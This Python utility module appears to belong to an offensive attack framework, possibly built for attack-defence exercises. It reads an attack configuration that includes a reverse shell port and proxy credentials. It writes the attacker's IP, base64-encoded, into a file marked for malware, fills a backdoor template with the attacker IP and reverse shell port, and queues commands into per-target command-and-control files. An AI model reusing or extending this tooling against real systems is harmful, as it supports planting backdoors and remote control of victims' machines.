#!/bin/env python
# -*- coding: utf-8 -*-
import os
import sys
import base64
import configparser
from statistics import mean
from urllib3 import util
from datetime import datetime
from logging import getLogger, FileHandler, Formatter
from collections import deque

# Printing colors.
OK_BLUE = '\033[94m'      # [*]
NOTE_GREEN = '\033[92m'   # [+]
FAIL_RED = '\033[91m'     # [-]
WARN_YELLOW = '\033[93m'  # [!]
ENDC = '\033[0m'
PRINT_OK = OK_BLUE + '[*]' + ENDC
PRINT_NOTE = NOTE_GREEN + '[+]' + ENDC
PRINT_FAIL = FAIL_RED + '[-]' + ENDC
PRINT_WARN = WARN_YELLOW + '[!]' + ENDC

# Type of printing.
OK = 'ok'         # [*]
NOTE = 'note'     # [+]
FAIL = 'fail'     # [-]
WARNING = 'warn'  # [!]
NONE = 'none'     # No label.


# Utility class.
class Utility:
    def __init__(self, target=None, team_name=None, debug=False):
        self.file_name = os.path.basename(__file__)
        self.full_path = os.path.dirname(os.path.abspath(__file__))

        self.target = target

        # Read config.inpyti.
        full_path = os.path.dirname(os.path.abspath(__file__))
        config = configparser.ConfigParser()
        config.read(os.path.join(full_path, 'attack_config.ini'), encoding='utf-8')

        try:
            #self.team_name = team_name
            # Common
            self.reverseshellport = config['Common']['reverse_shell_port']
            self.banner_delay = float(config['Common']['banner_delay'])
            self.ua = config['Common']['user-agent']
            #self.request_schema = config['Common']['request_schema']
            #self.con_timeout = float(config['Common']['con_timeout'])
            self.report_date_format = config['Common']['date_format']
            self.proxy_addr = config['Common']['proxy_addr']
            self.proxy_user = config['Common']['proxy_user']
            self.proxy_pass = config['Common']['proxy_pass']
            self.ok = config['Common']['ok']
            self.note = config['Common']['note']
            self.warning = config['Common']['warning']
            self.fail = config['Common']['fail']
            self.none = config['Common']['none']
            self.loop_wait_time = float(config['Common']['loop_wait_time'])
            #self.log_name = config['Common']['log_name']
            #self.log_dir = os.path.join(full_path, config['Common']['log_path'])
            #self.log_file = config['Common']['log_file'].format(self.target)
            #self.log_path = os.path.join(self.log_dir, self.log_file)


            
        except Exception as e:
            self.print_message(FAIL, 'Reading attackattack_config.ini is failure : {}'.format(e))
            sys.exit(1)

        # Initialize http session object.
        self.session = None

        # Set proxy server.
        if self.proxy_addr != '':
            parse_obj = util.parse_url(self.proxy_addr)
            if self.proxy_user != '':
                self.proxy = {parse_obj.scheme: parse_obj.scheme + '://' +
                                                self.proxy_user + ':' +
                                                self.proxy_pass + '@' +
                                                parse_obj.netloc}
            else:
                self.proxy = {parse_obj.scheme: self.proxy_addr}
        else:
            self.proxy = None

        ## Set HTTP request header.
        #self.http_req_header = {'User-Agent': self.ua,
        #                        'Connection': 'keep-alive',
        #                        'Accept-Language': 'ja,en-US;q=0.7,en;q=0.3',
        #                        'Accept-Encoding': 'gzip, deflate',
        #                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        #                        'Upgrade-Insecure-Requests': '1',
        #                        'Content-Type': 'application/x-www-form-urlencoded'}
        
        ## Setting logger.
        #self.logger = getLogger(self.log_name)
        #self.logger.setLevel(20)
        #file_handler = FileHandler(self.log_path)
        #self.logger.addHandler(file_handler)
        #formatter = Formatter('%(levelname)s,%(message)s')
        #file_handler.setFormatter(formatter)

    # Print metasploit's symbol.
    def print_message(self, type, message):
        if os.name == 'nt':
            if type == NOTE:
                print('[+] ' + message)
            elif type == FAIL:
                print('[-] ' + message)
            elif type == WARNING:
                print('[!] ' + message)
            elif type == NONE:
                print(message)
            else:
                print('[*] ' + message)
        else:
            if type == NOTE:
                print(PRINT_NOTE + ' ' + message)
            elif type == FAIL:
                print(PRINT_FAIL + ' ' + message)
            elif type == WARNING:
                print(PRINT_WARN + ' ' + message)
            elif type == NONE:
                print(NOTE_GREEN + message + ENDC)
            else:
                print(PRINT_OK + ' ' + message)

        return

    # Print exception messages.
    def print_exception(self, e, message):
        self.print_message(WARNING, 'type:{}'.format(type(e)))
        self.print_message(WARNING, 'args:{}'.format(e.args))
        self.print_message(WARNING, '{}'.format(e))
        self.print_message(WARNING, message)
        return

    #def write_log(self, loglevel, message):
    #    self.logger.log(loglevel, self.get_current_date() + ' ' + message)

    # Get current date.
    def get_current_date(self, indicate_format=None):
        if indicate_format is not None:
            date_format = indicate_format
        else:
            date_format = self.report_date_format
        return datetime.now().strftime(date_format)

    # Transform date from string to object.
    def transform_date_object(self, target_date, format=None):
        if format is None:
            return datetime.strptime(target_date, self.report_date_format)
        else:
            return datetime.strptime(target_date, format)

    # Transform date from object to string.
    def transform_date_string(self, target_date):
        return target_date.strftime(self.report_date_format)

    # Delete control character.
    def delete_ctrl_char(self, origin_text):
        clean_text = ''
        for char in origin_text:
            ord_num = ord(char)
            # Allow LF,CR,SP and symbol, character and numeric.
            if (ord_num == 10 or ord_num == 13) or (32 <= ord_num <= 126):
                clean_text += chr(ord_num)

        return clean_text

    # Convert string to integer.
    def transform_string_integer(self, origin_text):
        result = ''
        for c in origin_text:
            result += str(ord(c))

        return int(result)


    # Generate public files
    def generage_public_files(self, target, selfip, rshellport):
        # Generate file for malware.
        try:
            selfip4mal = selfip + ";"
            b644mal = base64.b64encode(selfip4mal.encode()).decode()
            with open(os.path.join(self.full_path, "public/_.syspoll-b64"), 'wb') as f11:
                f11.write(b644mal.encode())
        except Exception as e:
            self.print_exception(e, 'Failed to generate syspoll-b64 file.')
        
        try:
            filename = target + ".cmd"
            with open(os.path.join(self.full_path, "tools/c2s/cmd/" + filename), 'wb') as f12:
                f12.write("".encode())
        except Exception as e:
            self.print_exception(e, 'Failed to generate %s file.' % filename)

        # Generate file for backdoor.
        try:
            with open(os.path.join(self.full_path, "public/bd_base.txt"), 'rb') as f21:
                # read whole file
                bd_base = f21.read()
                bd_base = bd_base.decode() % (selfip, rshellport)
                with open(os.path.join(self.full_path, "public/bd.txt"), 'wb') as f22:
                    # write data
                    f22.write(bd_base.encode())
        except Exception as e:
            self.print_exception(e, 'Failed to generate bd.txt file.')


    # append c2 command to file
    def add_c2cmd(self, target, cmd):     
        try:
            filename = target + ".cmd"
            with open("tools/c2s/cmd/" + filename, 'wb') as f11:
                f11.write("1\t" + cmd + "\n")
        except Exception as e:
            self.print_exception(e, 'Failed to generate %s file.' % filename)
    



